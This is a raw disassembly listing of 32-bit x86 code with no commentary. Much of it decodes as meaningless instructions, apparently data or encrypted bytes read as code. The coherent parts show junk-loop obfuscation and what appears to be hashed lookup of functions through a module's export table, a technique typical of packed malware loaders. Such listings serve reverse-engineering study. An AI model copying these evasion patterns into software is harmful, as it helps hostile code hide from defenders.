  4119d6:	add    eax,0x9714763
  4119db:	or     eax,0xf6bc907d
  4119e0:	mov    al,0x4d
  4119e2:	loop   0x41196f
  4119e4:	int3   
  4119e5:	and    eax,0xb3019d83
  4119ea:	pop    es
  4119eb:	out    0x3e,al
  4119ed:	push   eax
  4119ee:	xor    eax,0x136deabc
  4119f3:	add    eax,0xb0ddae73
  4119f8:	rol    DWORD PTR [esi],cl
  4119fa:	js     0x411a6d
  4119fc:	sbb    al,0x92
  4119fe:	jno    0x411a12
  411a00:	mov    ds:0x61e9bf1d,al
  411a05:	jg     0x4119b1
  411a07:	jge    0x4119f4
  411a09:	fwait
  411a0a:	cld    
  411a0b:	pop    es
  411a0c:	dec    ebp
  411a0d:	or     eax,0x9e90fdac
  411a12:	sti    
  411a13:	push   ebx
  411a14:	outs   dx,BYTE PTR ds:[esi]
  411a15:	sub    al,0xdc
  411a17:	bound  esi,QWORD PTR ds:0x31d7e4b4
  411a1d:	xor    al,0x5c
  411a1f:	mov    cl,0xd3
  411a21:	mov    ds:0x19129db0,eax
  411a26:	add    BYTE PTR [ecx],0x65
  411a29:	push   ebp
  411a2a:	jbe    0x411aab
  411a2c:	lds    edx,FWORD PTR [eax+0x3d]
  411a2f:	jb     0x411a6a
  411a31:	xchg   esi,eax
  411a32:	mov    ds:0x90578a70,al
  411a37:	pop    ss
  411a38:	push   0xa0cfbb73
  411a3d:	mov    bl,BYTE PTR [eax]
  411a3f:	xchg   esi,ecx
  411a41:	sub    edx,edi
  411a43:	xor    ecx,DWORD PTR ds:0x434677
  411a49:	xor    esi,esi
  411a4b:	adc    DWORD PTR ds:0x4345f7,edi
  411a51:	mov    DWORD PTR [ebp-0x28],esi
  411a54:	mov    DWORD PTR [ebp-0x2c],esi
  411a57:	dec    DWORD PTR ds:0x4346cf
  411a5d:	mov    DWORD PTR [ebp-0x14],esi
  411a60:	mov    DWORD PTR [ebp-0x8],esi
  411a63:	mov    ecx,DWORD PTR [ebp-0x18]
  411a66:	add    DWORD PTR ds:0x4346cf,0x3520
  411a70:	xor    ecx,eax
  411a72:	xor    edi,edi
  411a74:	add    ecx,ebx
  411a76:	mov    DWORD PTR [ebp-0x20],ecx
  411a79:	mov    DWORD PTR ds:0x434637,ebx
  411a7f:	mov    eax,DWORD PTR [ebp-0x20]
  411a82:	mov    DWORD PTR ds:0x4345ff,0x2abf
  411a8c:	je     0x4122b7
  411a92:	adc    DWORD PTR ds:0x4345eb,0x60fd
  411a9c:	mov    eax,DWORD PTR [ebp-0x4]
  411a9f:	adc    DWORD PTR ds:0x434653,0x6e6
  411aa9:	xor    eax,0x7510851
  411aae:	or     DWORD PTR ds:0x4346c3,0x43467b
  411ab8:	add    eax,ebx
  411aba:	mov    DWORD PTR ds:0x434713,0x35f1
  411ac4:	cmp    edi,eax
  411ac6:	jne    0x411c5a
  411acc:	sbb    DWORD PTR ds:0x4345f3,0x4345e7
  411ad6:	push   DWORD PTR [ebp+0x8]
  411ad9:	or     DWORD PTR ds:0x43470f,0x4346cb
  411ae3:	call   0x4104be
  411ae8:	and    ecx,DWORD PTR ds:0x43464f
  411aee:	mov    DWORD PTR [ebp-0x20],eax
  411af1:	mov    eax,DWORD PTR [ebp-0x4]
  411af4:	mov    ecx,DWORD PTR [ebp-0x20]
  411af7:	and    DWORD PTR ds:0x4346b7,0x0
  411b01:	mov    esi,DWORD PTR ds:0x4346b7
  411b07:	inc    esi
  411b08:	mov    DWORD PTR ds:0x4346b7,esi
  411b0e:	cmp    DWORD PTR ds:0x4346b7,0x1e
  411b15:	jne    0x411b26
  411b1b:	push   0x1cd9
  411b20:	call   DWORD PTR ds:0x4132b4
  411b26:	cmp    DWORD PTR ds:0x4346b7,0x18
  411b2d:	jb     0x411b01
  411b33:	mov    esi,0x7510851
  411b38:	xor    eax,esi
  411b3a:	add    eax,ebx
  411b3c:	cmp    ecx,eax
  411b3e:	je     0x411e9b
  411b44:	or     DWORD PTR ds:0x4346b7,0x434677
  411b4e:	push   DWORD PTR [ebp-0x20]
  411b51:	push   DWORD PTR [ebp+0x8]
  411b54:	sub    DWORD PTR ds:0x434637,0x4345e7
  411b5e:	call   0x404d31
  411b63:	movzx  ecx,WORD PTR ds:0x4346b7
  411b6a:	and    ecx,DWORD PTR ds:0x43468b
  411b70:	mov    DWORD PTR ds:0x4346b7,ecx
  411b76:	mov    DWORD PTR [ebp-0x14],eax
  411b79:	mov    DWORD PTR ds:0x43470f,0x13
  411b83:	cmp    DWORD PTR ds:0x43470f,0x0
  411b8a:	je     0x411bc6
  411b90:	cmp    DWORD PTR ds:0x43470f,0x22
  411b97:	jne    0x411bad
  411b9d:	push   0x434810
  411ba2:	push   0x4347b5
  411ba7:	call   DWORD PTR ds:0x4130e4
  411bad:	xor    eax,eax
  411baf:	or     eax,DWORD PTR ds:0x43470f
  411bb5:	dec    eax
  411bb6:	mov    ds:0x43470f,eax
  411bbb:	jmp    0x411b83
  411bc0:	add    DWORD PTR ds:0x4345eb,edx
  411bc6:	mov    eax,DWORD PTR [ebp-0x4]
  411bc9:	mov    DWORD PTR ds:0x4346cb,0x10
  411bd3:	cmp    DWORD PTR ds:0x4346cb,0x0
  411bda:	je     0x411c1c
  411be0:	cmp    DWORD PTR ds:0x4346cb,0x1b
  411be7:	jne    0x411c0a
  411bed:	push   DWORD PTR [ebp-0x20]
  411bf0:	push   0x4372
  411bf5:	push   0x4348d5
  411bfa:	push   0x4348e9
  411bff:	push   0x7ff3
  411c04:	call   DWORD PTR ds:0x4130e8
  411c0a:	mov    ecx,DWORD PTR ds:0x4346cb
  411c10:	dec    ecx
  411c11:	mov    DWORD PTR ds:0x4346cb,ecx
  411c17:	jmp    0x411bd3
  411c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  411c1f:	xor    eax,esi
  411c21:	add    eax,ebx
  411c23:	cmp    ecx,eax
  411c25:	je     0x411e9b
  411c2b:	mov    eax,DWORD PTR [ebp-0x14]
  411c2e:	mov    eax,DWORD PTR [eax+0x18]
  411c31:	mov    DWORD PTR [ebp-0x20],eax
  411c34:	mov    eax,DWORD PTR [ebp-0x14]
  411c37:	mov    ecx,DWORD PTR [ebp+0x8]
  411c3a:	add    ecx,DWORD PTR [eax+0x20]
  411c3d:	mov    DWORD PTR [ebp-0x28],ecx
  411c40:	mov    eax,DWORD PTR [ebp-0x14]
  411c43:	mov    ecx,DWORD PTR [ebp+0x8]
  411c46:	add    ecx,DWORD PTR [eax+0x24]
  411c49:	mov    DWORD PTR [ebp-0x2c],ecx
  411c4c:	mov    eax,DWORD PTR [ebp-0x14]
  411c4f:	mov    ecx,DWORD PTR [ebp+0x8]
  411c52:	add    ecx,DWORD PTR [eax+0x1c]
  411c55:	xor    esi,esi
  411c57:	mov    DWORD PTR [ebp-0x14],ecx
  411c5a:	mov    eax,DWORD PTR [ebp-0x28]
  411c5d:	mov    ecx,DWORD PTR [ebp+0x8]
  411c60:	jmp    0x411e60
  411c65:	scas   al,BYTE PTR es:[edi]
  411c66:	repz push esi
  411c68:	add    dl,BYTE PTR [ebx-0x5d]
  411c6b:	push   0x73
  411c6d:	out    dx,eax
  411c6e:	sub    DWORD PTR [ecx+0x2f],esp
  411c71:	jb     0x411c08
  411c73:	mov    ch,0xc4
  411c75:	aad    0x56
  411c77:	jle    0x411cf7
  411c79:	pop    ecx
  411c7a:	jg     0x411cfa
  411c7c:	jle    0x411c2e
  411c7e:	mov    DWORD PTR [esi+0x4],ebx
  411c81:	xchg   edx,eax
  411c82:	xlat   BYTE PTR ds:[ebx]
  411c83:	test   bl,al
  411c85:	sar    bh,0x50
  411c88:	out    0x43,al
  411c8a:	xorps  xmm2,xmm0
  411c8d:	mov    ebx,esi
  411c8f:	add    BYTE PTR [eax+0x43],dh
  411c92:	add    bl,BYTE PTR [edx+0x2f99740b]
  411c98:	mov    esp,0xe18dba13
  411c9d:	inc    ecx
  411c9e:	outs   dx,BYTE PTR ds:[esi]
  411c9f:	jge    0x411cbb
  411ca1:	ins    BYTE PTR es:[edi],dx
  411ca2:	(bad)  
  411ca3:	dec    edx
  411ca4:	sbb    bh,bl
  411ca6:	idiv   BYTE PTR [edi+0x15]
  411ca9:	xlat   BYTE PTR ds:[ebx]
  411caa:	lahf   
  411cab:	xor    edi,esp
  411cad:	dec    eax
  411cae:	push   ebp
  411caf:	shl    BYTE PTR [eax+0x1db8dd20],0x47
  411cb6:	add    eax,0x2675a82
  411cbb:	shl    cl,cl
  411cbd:	leave  
  411cbe:	lods   eax,DWORD PTR ds:[esi]
  411cbf:	adc    eax,0x36044e51
  411cc4:	cmp    eax,ebx
  411cc6:	int3   
  411cc7:	xchg   ebx,eax
  411cc8:	jg     0x411c96
  411cca:	popa   
  411ccb:	mov    esi,DWORD PTR [edx]
  411ccd:	es fs in eax,dx
  411cd0:	xchg   ecx,eax
  411cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cd2:	and    DWORD PTR [esi+0x30],esp
  411cd5:	and    DWORD PTR [ecx],0xd017fd78
  411cdb:	ins    BYTE PTR es:[edi],dx
  411cdc:	sbb    ebx,DWORD PTR [esi+0x48092b51]
  411ce2:	mov    bl,0x4d
  411ce4:	loop   0x411d09
  411ce6:	retf   
  411ce7:	or     dh,BYTE PTR [ecx]
  411ce9:	cli    
  411cea:	sbb    BYTE PTR [ecx+0x26],bl
  411ced:	adc    dl,dh
  411cef:	and    al,0x79
  411cf1:	add    eax,0x2da23c31
  411cf6:	jp     0x411cd7
  411cf8:	push   ds
  411cf9:	mov    al,ds:0xfbe498a8
  411cfe:	jl     0x411d50
  411d00:	pop    ds
  411d01:	aam    0xe7
  411d03:	cmp    eax,0x48720d5a
  411d08:	jg     0x411d7c
  411d0a:	ret    
  411d0b:	(bad)  [edx+ebp*8]
  411d0e:	sub    eax,0x47dd58cc
  411d13:	sub    al,0xdb
  411d15:	xor    edi,ebp
  411d17:	sbb    eax,0xc217b7a3
  411d1c:	gs cmc 
  411d1e:	repnz dec esp
  411d20:	cmc    
  411d21:	xor    DWORD PTR [eax+ebx*2+0x1232c712],edx
  411d28:	sbb    eax,0x7e21445c
  411d2d:	dec    esp
  411d2e:	ficom  WORD PTR [ebp-0x1285088a]
  411d34:	enter  0x6a2a,0xc7
  411d38:	add    bh,BYTE PTR [ebx+0x1]
  411d3b:	inc    esp
  411d3c:	push   edi
  411d3d:	dec    eax
  411d3e:	jge    0x411d4e
  411d40:	ror    ch,0x3e
  411d43:	iret   
  411d44:	in     eax,dx
  411d45:	mov    bh,0xfd
  411d47:	loope  0x411d88
  411d49:	pop    ebx
  411d4a:	popf   
  411d4b:	sar    DWORD PTR [esp+ebp*2+0x2e],1
  411d4f:	(bad)  
  411d50:	popf   
  411d51:	xor    al,0x53
  411d53:	mov    bh,0xc1
  411d55:	dec    edi
  411d56:	cmp    al,0x0
  411d58:	js     0x411d6f
  411d5a:	call   0x6463ab37
  411d5f:	push   ecx
  411d60:	mov    ah,0x56
  411d62:	add    al,0x99
  411d64:	popf   
  411d65:	imul   ebx,edi,0xffffffa4
  411d68:	jle    0x411cff
  411d6a:	js     0x411d0c
  411d6c:	(bad)  
  411d6d:	cmp    ebp,DWORD PTR [ebx]
  411d6f:	pop    ebp
  411d70:	push   ebp
  411d71:	pop    edi
  411d72:	jae    0x411de6
  411d74:	push   eax
  411d75:	ss stos DWORD PTR es:[edi],eax
  411d77:	mov    ds:0x53a9b6a8,eax
  411d7c:	push   esi
  411d7d:	dec    esp
  411d7e:	add    al,0xfd
  411d80:	cmp    BYTE PTR [ebx-0x1b],bh
  411d83:	jmp    0x411ddf
  411d85:	sub    edi,DWORD PTR [eax-0x6b26c458]
  411d8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d8c:	xor    cl,BYTE PTR [edi-0x39]
  411d8f:	scas   al,BYTE PTR es:[edi]
  411d90:	push   0x2a71743c
  411d95:	xlat   BYTE PTR ds:[ebx]
  411d96:	hlt    
  411d97:	popa   
  411d98:	(bad)  
  411d99:	push   esp
  411d9a:	mov    esp,0xaa2694b5
  411d9f:	nop
  411da0:	hlt    
  411da1:	xchg   edx,eax
  411da2:	inc    ecx
  411da3:	inc    edx
  411da4:	(bad)  
  411da5:	sub    edx,DWORD PTR [ecx+0x77388394]
  411dab:	push   esi
  411dac:	jbe    0x411da6
  411dae:	jne    0x411d76
  411db0:	int    0x69
  411db2:	test   al,0x9a
  411db4:	je     0x411db9
  411db6:	inc    edi
  411db7:	lock xor BYTE PTR [edx+0x2c],dl
  411dbb:	shr    BYTE PTR [ecx],0xc
  411dbe:	inc    esp
  411dbf:	mov    al,ds:0x4450df4f
  411dc4:	add    eax,0x70166380
  411dc9:	xor    BYTE PTR [esi+0x5adb0486],0x74
  411dd0:	psllw  mm3,QWORD PTR [ecx-0x1c]
  411dd4:	pop    edi
  411dd5:	push   ebp
  411dd6:	xchg   ebx,eax
  411dd7:	hlt    
  411dd8:	xor    dh,dh
  411dda:	retf   0xffb7
  411ddd:	push   ebp
  411dde:	mov    al,0xc3
  411de0:	pop    edi
  411de1:	scas   al,BYTE PTR es:[edi]
  411de2:	jns    0x411e46
  411de4:	dec    edi
  411de5:	push   eax
  411de6:	int    0x2c
  411de8:	mov    cl,0xa2
  411dea:	adc    BYTE PTR [ebx-0x385149ce],bl
  411df0:	sahf   
  411df1:	cmp    al,0x60
  411df3:	push   cs
  411df4:	repnz jmp 0x795c:0xd1dc060e
  411dfc:	ror    BYTE PTR [esp+edx*2-0x3a],cl
  411e00:	pop    ss
  411e01:	jo     0x411dad
  411e03:	shr    edx,1
  411e05:	push   cs
  411e06:	xor    dl,BYTE PTR [edi]
  411e08:	mov    ah,0x7a
  411e0a:	out    0x30,al
  411e0c:	sbb    BYTE PTR [ebx-0x14],bl
  411e0f:	call   0xc984:0x937ce882
  411e16:	es inc ecx
  411e18:	(bad)  
  411e19:	fsubr  QWORD PTR [ecx+0x21]
  411e1c:	ds popf 
  411e1e:	add    al,0xb6
  411e20:	shl    DWORD PTR [ecx+ecx*1],0xda
  411e24:	mov    bl,0x57
  411e26:	pushf  
  411e27:	ins    DWORD PTR es:[edi],dx
  411e28:	fs shr al,cl
  411e2b:	fist   DWORD PTR [ebx-0x647d6d0a]
  411e31:	fwait
  411e32:	sub    DWORD PTR [esi-0xd56754e],0xb2bb600f
  411e3c:	jnp    0x411df6
  411e3e:	fbld   TBYTE PTR [edi+0x7149f421]
  411e44:	(bad)  
  411e45:	ins    DWORD PTR es:[edi],dx
  411e46:	mov    ds:0x825d80a4,eax
  411e4b:	call   0x4d75:0xde22a81f
  411e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e53:	popa   
  411e54:	jmp    0x88a5:0xdd5ebe58
  411e5b:	(bad)  
  411e5c:	enter  0x83e4,0xc4
  411e60:	add    ecx,DWORD PTR [eax+edi*4]
  411e63:	lea    eax,[ebp-0x8]
  411e66:	mov    DWORD PTR [ebp-0x30],ecx
  411e69:	push   eax
  411e6a:	push   DWORD PTR [ebp-0x30]
  411e6d:	push   DWORD PTR [ebp+0xc]
  411e70:	call   0x402e72
  411e75:	mov    eax,DWORD PTR [ebp-0x4]
  411e78:	mov    ecx,DWORD PTR [ebp-0x8]
  411e7b:	xor    eax,0x7510851
  411e80:	add    eax,ebx
  411e82:	cmp    ecx,eax
  411e84:	jne    0x411ea7
  411e8a:	mov    eax,DWORD PTR [ebp-0x20]
  411e8d:	inc    edi
  411e8e:	cmp    edi,eax
  411e90:	jb     0x411a92
  411e96:	jmp    0x4122b7
  411e9b:	mov    eax,DWORD PTR [ebp-0x4]
  411e9e:	xor    eax,esi
  411ea0:	add    eax,ebx
  411ea2:	jmp    0x412c05
  411ea7:	mov    eax,DWORD PTR [ebp-0x2c]
  411eaa:	movzx  eax,WORD PTR [eax+edi*2]
  411eae:	jmp    0x4120ae
  411eb3:	retf   
  411eb4:	dec    ebp
  411eb5:	add    DWORD PTR [edi+0x6d757391],esi
  411ebb:	je     0x411ea0
  411ebd:	jge    0x411f08
  411ebf:	push   ebp
  411ec0:	(bad)
  411ec4:	push   eax
  411ec5:	jle    0x411f45
  411ec7:	pop    ecx
  411ec8:	jg     0x411f48
  411eca:	jle    0x411eaa
  411ecc:	mov    cs,WORD PTR [esp+esi*1]
  411ecf:	dec    ebx
  411ed0:	sbb    al,0xab
  411ed2:	sub    eax,0xd74c086c
  411ed7:	jmp    0xdf2d1e71
  411edc:	mov    ch,0xb2
  411ede:	or     DWORD PTR [edi],ebp
  411ee0:	retf   
  411ee1:	(bad)  
  411ee2:	pop    ss
  411ee3:	call   0x78a3e282
  411ee8:	mov    ds:0x9269af73,eax
  411eed:	add    ebx,DWORD PTR [ebx-0x5c]
  411ef0:	mov    cl,0x2c
  411ef2:	inc    BYTE PTR ds:0x63cd1ec3
  411ef8:	add    dh,BYTE PTR [ebp-0x33957d2c]
  411efe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411eff:	cmp    eax,0x4529fa9f
  411f04:	adc    DWORD PTR [eax+0xb],esi
  411f07:	aam    0xf7
  411f09:	lahf   
  411f0a:	xchg   edx,eax
  411f0b:	popa   
  411f0c:	xor    DWORD PTR [esi-0x86812d7],edx
  411f12:	add    esi,edi
  411f14:	mov    ebp,eax
  411f16:	fdivp  st(7),st
  411f18:	jge    0x411f27
  411f1a:	test   BYTE PTR [edi-0x7f],bl
  411f1d:	mov    eax,0xf7f73d93
  411f22:	add    al,0x61
  411f24:	in     al,0x3
  411f26:	push   ebp
  411f27:	jmp    0x8c761cd0
  411f2c:	push   0x1cf767ff
  411f31:	or     dh,BYTE PTR [ecx-0x17]
  411f34:	or     eax,0xbc9d8f7a
  411f39:	and    BYTE PTR [edx+0x55],0x4f
  411f3d:	push   es
  411f3e:	cwde   
  411f3f:	pusha  
  411f40:	cmp    BYTE PTR [edx-0xa],ch
  411f43:	inc    edi
  411f44:	mov    ch,0x39
  411f46:	ss jmp 0x411f77
  411f49:	and    al,0x14
  411f4b:	fdivr  DWORD PTR [edx]
  411f4d:	int3   
  411f4e:	in     eax,0xa4
  411f50:	fstp   TBYTE PTR [edi+ebx*4+0x37]
  411f54:	xchg   DWORD PTR [ebx+0xb],esi
  411f57:	mov    ds:0xc100f4b1,al
  411f5c:	mov    ebp,0xefdbb23b
  411f61:	sbb    al,0x93
  411f63:	gs push ebp
  411f65:	push   0x9f6018ac
  411f6a:	inc    edi
  411f6b:	ss and ebx,ebp
  411f6e:	dec    edx
  411f6f:	mov    dh,0x31
  411f71:	mov    ah,0xf9
  411f73:	int3   
  411f74:	push   eax
  411f75:	cmp    BYTE PTR [esi+0xf104c44],dh
  411f7b:	push   ebp
  411f7c:	push   ebp
  411f7d:	mov    ds:0xb9503129,al
  411f82:	in     eax,dx
  411f83:	jp     0x411fdc
  411f85:	rol    eax,1
  411f87:	stos   BYTE PTR es:[edi],al
  411f88:	jne    0x411f12
  411f8a:	ja     0x411f5b
  411f8c:	mov    ah,0x44
  411f8e:	adc    BYTE PTR [ecx],dl
  411f90:	xchg   ebp,eax
  411f91:	dec    edx
  411f92:	ins    DWORD PTR es:[edi],dx
  411f93:	pop    ss
  411f94:	ds enter 0xa18,0xc0
  411f99:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  411f9b:	and    eax,0x44fe9974
  411fa0:	lods   al,BYTE PTR ds:[esi]
  411fa1:	fnstenv [edi]
  411fa3:	stos   BYTE PTR es:[edi],al
  411fa4:	and    edx,DWORD PTR [esi-0x3282b9d4]
  411faa:	push   es
  411fab:	daa    
  411fac:	jecxz  0x411ffa
  411fae:	sub    BYTE PTR [edx+0x22],al
  411fb1:	shl    esp,cl
  411fb3:	or     al,0x83
  411fb5:	jmp    0x690a:0x42a12c7d
  411fbc:	in     eax,dx
  411fbd:	popf   
  411fbe:	jmp    0xf17304
  411fc3:	jmp    0xfb25fef7
  411fc8:	pop    ecx
  411fc9:	push   ebx
  411fca:	stos   BYTE PTR es:[edi],al
  411fcb:	jne    0x41200a
  411fcd:	lahf   
  411fce:	or     DWORD PTR [ebx],ebx
  411fd0:	dec    esi
  411fd1:	add    BYTE PTR [edx],bl
  411fd3:	dec    ebp
  411fd4:	arpl   WORD PTR [ecx+ebx*8+0xfde469a],ax
  411fdb:	je     0x412033
  411fdd:	adc    al,0x9d
  411fdf:	repz in al,0x94
  411fe2:	mov    dl,0xd8
  411fe4:	ja     0x411fbd
  411fe6:	lds    ecx,FWORD PTR [edi-0x22]
  411fe9:	popf   
  411fea:	mov    edi,0xfa05dfb4
  411fef:	into   
  411ff0:	pop    eax
  411ff1:	pop    ebx
  411ff2:	adc    al,0x5d
  411ff4:	mov    al,ds:0x3b011c2
  411ff9:	sbb    al,0x2a
  411ffb:	imul   eax,DWORD PTR [ecx-0x4d],0x51af9f1
  412002:	xor    esi,edx
  412004:	jno    0x411fa9
  412006:	lock sub BYTE PTR [esi],ch
  412009:	mov    edx,0x54154115
  41200e:	sub    dh,BYTE PTR [edx+0x23]
  412011:	in     eax,dx
  412012:	mov    eax,ds:0x2093f7ea
  412017:	lods   eax,DWORD PTR ds:[esi]
  412018:	aam    0x39
  41201a:	cli    
  41201b:	(bad)  
  41201c:	js     0x412025
  41201e:	mov    ebx,0xc1909d1
  412023:	imul   eax,DWORD PTR [edi+0x7a],0x2ddb5490
  41202a:	push   0x7b0e1c73
  41202f:	test   DWORD PTR [edi-0x7e],esi
  412032:	or     DWORD PTR [ebx],ebp
  412034:	dec    esi
  412035:	dec    ebp
  412036:	add    ah,bl
  412038:	loope  0x411fc5
  41203a:	or     BYTE PTR [ecx+0x9],cl
  41203d:	fs dec eax
  41203f:	stos   DWORD PTR es:[edi],eax
  412040:	repz cmp al,0x27
  412043:	out    dx,eax
  412044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412045:	lods   eax,DWORD PTR ds:[esi]
  412046:	add    eax,0xe858f124
  41204b:	xor    DWORD PTR [eax+0x4b],esi
  41204e:	push   esi
  41204f:	aad    0x17
  412051:	sti    
  412052:	(bad)  
  412053:	xchg   ebp,eax
  412054:	cwde   
  412055:	sub    edx,DWORD PTR [esp+edx*4]
  412058:	sbb    dh,dh
  41205a:	nop
  41205b:	add    DWORD PTR [ebp+0x6e6ec400],ebp
  412061:	dec    esi
  412062:	mov    eax,0xb89eb03b
  412067:	mov    es,WORD PTR [ebp-0x4c]
  41206a:	and    eax,0xe5ba8161
  41206f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412070:	mov    al,ds:0x18ea185d
  412075:	test   BYTE PTR [ecx],dl
  412077:	pop    es
  412078:	stc    
  412079:	inc    eax
  41207a:	jno    0x412015
  41207c:	xor    edi,ebx
  41207e:	cmovo  ebp,edx
  412081:	leave  
  412082:	outs   dx,DWORD PTR ds:[esi]
  412083:	ja     0x41204a
  412085:	push   esi
  412086:	xchg   ebp,eax
  412087:	or     dh,bh
  412089:	popa   
  41208a:	int    0x3e
  41208c:	es jle 0x41204b
  41208f:	pop    ecx
  412090:	test   esp,0x55aa4915
  412096:	dec    ecx
  412097:	ret    0x419
  41209a:	jo     0x4120bc
  41209c:	rcr    DWORD PTR [edi-0x36],0xda
  4120a0:	(bad)  
  4120a1:	mov    dl,0x6f
  4120a3:	xor    ch,BYTE PTR [edx]
  4120a5:	(bad)  
  4120a6:	daa    
  4120a7:	adc    DWORD PTR [ebx-0x3],0xb8dbc165
  4120ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4120b1:	mov    eax,DWORD PTR [ecx+eax*4]
  4120b4:	jmp    0x4122b4
  4120b9:	cmp    DWORD PTR [ecx+ebx*4+0x69156508],esp
  4120c0:	jne    0x4120eb
  4120c2:	xchg   edx,eax
  4120c3:	mov    al,0xd4
  4120c5:	bound  edx,QWORD PTR [esi+0x32]
  4120c8:	or     edx,DWORD PTR [ebx]
  4120ca:	push   edx
  4120cb:	jle    0x41214b
  4120cd:	pop    ecx
  4120ce:	jg     0x41214e
  4120d0:	jle    0x41211b
  4120d2:	add    eax,eax
  4120d4:	jb     0x412134
  4120d6:	ja     0x412141
  4120d8:	pop    esi
  4120d9:	push   ds
  4120da:	push   ds
  4120db:	cmp    edx,esi
  4120dd:	outs   dx,DWORD PTR ds:[esi]
  4120de:	inc    ecx
  4120df:	ds pushf 
  4120e1:	pop    eax
  4120e2:	dec    ebp
  4120e3:	mov    eax,ds:0x6c691d14
  4120e8:	cmp    BYTE PTR [eax+0x2fab7b36],bh
  4120ee:	adc    DWORD PTR [eax-0x6848667f],ebx
  4120f4:	xchg   BYTE PTR ds:0x72f3972f,ah
  4120fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120fb:	je     0x412087
  4120fd:	jl     0x412142
  4120ff:	jbe    0x41213b
  412101:	nop
  412102:	pop    di
  412104:	xchg   BYTE PTR [ebx-0x7c982306],bl
  41210a:	xor    edx,DWORD PTR [edi-0x40a42666]
  412110:	mov    al,0x60
  412112:	test   bl,0xf4
  412115:	cmp    ch,dh
  412117:	and    eax,0x6a2332be
  41211c:	div    DWORD PTR [ebx]
  41211e:	fisttp WORD PTR [ebx-0x1978cb00]
  412124:	xchg   BYTE PTR [edx-0xb],cl
  412127:	aas    
  412128:	test   bl,bh
  41212a:	test   DWORD PTR [bx],ecx
  41212d:	les    esp,FWORD PTR [ebx]
  41212f:	cli    
  412130:	mov    ecx,0xc63fb2e8
  412135:	ss stos BYTE PTR es:[edi],al
  412137:	sub    al,0x13
  412139:	into   
  41213a:	aaa    
  41213b:	sbb    bh,ah
  41213d:	cmp    esi,esp
  41213f:	in     eax,dx
  412140:	dec    eax
  412141:	xlat   BYTE PTR ds:[ebx]
  412142:	xchg   DWORD PTR [ebx+0x31],eax
  412145:	leave  
  412146:	es leave 
  412148:	aaa    
  412149:	sahf   
  41214a:	or     eax,0x3b0f0c8f
  41214f:	test   eax,0xb3cb9b29
  412154:	xor    esp,eax
  412156:	sub    DWORD PTR [eax-0x34],eax
  412159:	lahf   
  41215a:	mov    eax,ds:0xe4aea033
  41215f:	pop    ebp
  412160:	push   cs
  412161:	lds    ebp,FWORD PTR [esi-0x7f]
  412164:	mov    al,ds:0x1880b858
  412169:	ret    
  41216a:	mov    WORD PTR [ecx-0x3034a17c],cs
  412170:	sub    dl,dh
  412172:	out    dx,al
  412173:	push   ebx
  412174:	arpl   WORD PTR [edi],bx
  412176:	push   ebp
  412177:	jo     0x412136
  412179:	test   ah,ch
  41217b:	lahf   
  41217c:	push   ebp
  41217d:	xchg   ebx,eax
  41217e:	aaa    
  41217f:	test   BYTE PTR [eax-0x24],al
  412182:	push   ecx
  412183:	pop    ss
  412184:	(bad)  
  412185:	mov    cl,0x70
  412187:	ds push edx
  412189:	jge    0x41212c
  41218b:	mov    al,ds:0x16f05d04
  412190:	xor    eax,0x6611e022
  412195:	cld    
  412196:	inc    eax
  412197:	fcomp  DWORD PTR [esi-0x78]
  41219a:	imul   edi,DWORD PTR [esi-0x4cf63acb],0xe3356502
  4121a4:	or     ebp,DWORD PTR [eax+eiz*2+0x6a]
  4121a8:	addr16 jne 0x4121cd
  4121ab:	inc    edx
  4121ac:	jmp    0x412162
  4121ae:	xor    eax,0x5888b1de
  4121b3:	and    esi,DWORD PTR [esi+0x7cccd2f2]
  4121b9:	mov    ds:0x91f5d6c0,al
  4121be:	retf   
  4121bf:	nop
  4121c0:	sbb    ebp,ebp
  4121c2:	inc    edx
  4121c3:	scas   eax,DWORD PTR es:[edi]
  4121c4:	sbb    BYTE PTR [esi],0x69
  4121c7:	pop    ebp
  4121c8:	cmp    cl,BYTE PTR [edx-0x3a238462]
  4121ce:	paddusb mm0,mm0
  4121d1:	pop    ds
  4121d2:	or     ecx,ecx
  4121d4:	inc    edx
  4121d5:	hlt    
  4121d6:	stc    
  4121d7:	call   0xf9b3:0x590e5b07
  4121de:	dec    edx
  4121df:	out    dx,eax
  4121e0:	sub    bh,BYTE PTR [eax]
  4121e2:	fidiv  WORD PTR [ebx+0x4f]
  4121e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121e6:	popf   
  4121e7:	sub    dh,BYTE PTR [ebx+edx*2+0x62ac5257]
  4121ee:	pop    esi
  4121ef:	(bad)  
  4121f0:	fldenv [eax+0x79accad2]
  4121f6:	dec    eax
  4121f7:	(bad)
  4121fa:	loopne 0x412225
  4121fc:	mov    al,dl
  4121fe:	pusha  
  4121ff:	jmp    0x4d24:0x159e2ff3
  412206:	pusha  
  412207:	mov    edi,0xc7f57b3e
  41220c:	inc    ebp
  41220d:	mov    ebp,0x6c39f0f0
  412212:	xor    BYTE PTR [ebp+0x3],cl
  412215:	mov    dh,0x67
  412217:	pop    ebx
  412218:	mov    al,ds:0x51b3445c
  41221d:	mov    esp,0xdadfcf0
  412222:	mov    bl,BYTE PTR [ecx+0x4f40cf3f]
  412228:	dec    ecx
  412229:	mov    dh,0xc4
  41222b:	mov    WORD PTR [edx],ss
  41222d:	imul   esp,DWORD PTR [edi-0x1f0187a7],0xffffff99
  412234:	popf   
  412235:	mov    eax,ds:0x6a7a9bb0
  41223a:	call   0x359fc3ff
  41223f:	sub    BYTE PTR [ebx-0x55],bh
  412242:	in     eax,dx
  412243:	sbb    DWORD PTR [ecx+0x77eb7f12],0xffffffeb
  41224a:	mov    esp,0x3d0a9541
  41224f:	mov    dh,0x4
  412251:	inc    ebx
  412252:	and    al,0xb4
  412254:	pop    es
  412255:	jns    0x4122a2
  412257:	nop    DWORD PTR [edi+0x6e3f900a]
  41225e:	mov    esi,0xa7e107db
  412263:	cmp    dl,al
  412265:	int3   
  412266:	aam    0x7d
  412268:	mov    ds:0x115b0178,eax
  41226d:	mov    WORD PTR [edx+0x4e],cs
